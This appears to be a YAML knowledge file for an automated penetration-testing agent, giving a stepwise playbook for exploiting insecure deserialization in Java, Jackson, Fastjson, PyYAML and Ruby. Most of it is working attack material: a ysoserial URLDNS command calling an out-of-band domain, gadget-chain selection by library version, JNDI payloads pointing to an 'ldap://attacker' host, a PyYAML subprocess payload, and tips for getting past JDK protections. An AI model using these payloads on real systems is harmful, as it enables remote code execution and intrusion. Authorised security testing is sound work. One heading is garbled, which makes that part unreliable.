  - java gadget
  - yaml.load
  - viewstate
  - readobject
tools:
  - python3
  - curl
knowledge: |
  Advanced deserialization targets polymorphic type resolvers and Java gadget chains where
  the receiving parser reconstructs objects according to embedded class names and reflection.

  1. SAFE OAST ORACLE CONFIRMATION (STEP 0 — URLDNS):
     Before firing command execution gadgets, confirm the Java deserialization sink non-destructively:
     - Generate URLDNS payload (invokes java.net.URL.hashCode() triggering DNS lookup, ZERO command execution):
       java -jar ysoserial.jar URLDNS "http://UNIQUE.interactsh-domain.com" | base64 -w0
     - Inject into suspect parameter, cookie (rememberMe), or HTTP header.
     - Observe DNS interaction on interactsh:
       If DNS request arrives, `ObjectInputStream.readObject()` is confirmed active!

  2. JAVA CLASSPATH FINGERPRINTING & GADGET SELECTION:
     Select gadget chains based on fingerprinted dependency versions:
     - Apache Commons Collections:
       CC 3.1 - 3.2.1: CommonsCollections1 (InvokerTransformer, requires security manager bypass)
       CC 4.0: CommonsCollections2, CommonsCollections4
       CC 3.2.2+: CommonsCollections5, CommonsCollections6 (LazyMap via TiedMapEntry)
     - Spring Framework: Spring1, Spring2
     - Groovy: Groovy1 (MethodClosure invocation)
     - ROME / AspectJ / C3P0 for JNDI reference injection.

  3. POLYMORPHIC JSON TYPING CONFUSION (JACKSON / FASTJSON):
     When Jackson `enableDefaultTyping()` or `@JsonTypeInfo(use = Id.CLASS)` is configured:
     Probe for SSRF / JNDI injection via arbitrary class instantiation:
       ["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o","autoCommit":true}]
     Fastjson AutoType Bypass:
       When AutoType is enabled or bypassed via class name formatting:
       `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/o","autoCommit":true}`

  4. PY签YAML & RUBY MARSHAL CONFUSION:
     - PyYAML `yaml.load(input)` without SafeLoader:
       `!!python/object/apply:subprocess.check_output [["id"]]`
     - Ruby `Marshal.load(input)`:
       Craft Gem::Requirement / Gem::SpecFetcher gadget chains to achieve code execution.

  5. EVIDENCE & SITUATION HANDLING:
     - In Java environments with modern JDK (JDK 8u191+):
       Remote classloading over LDAP/RMI is blocked by `trustURLCodebase=false`.
       Pivot to local gadget chains (Tomcat BeanFactory, Groovy) instead of remote classloading.
     - Document exact library versions, vulnerable class name, and verification DNS interaction.
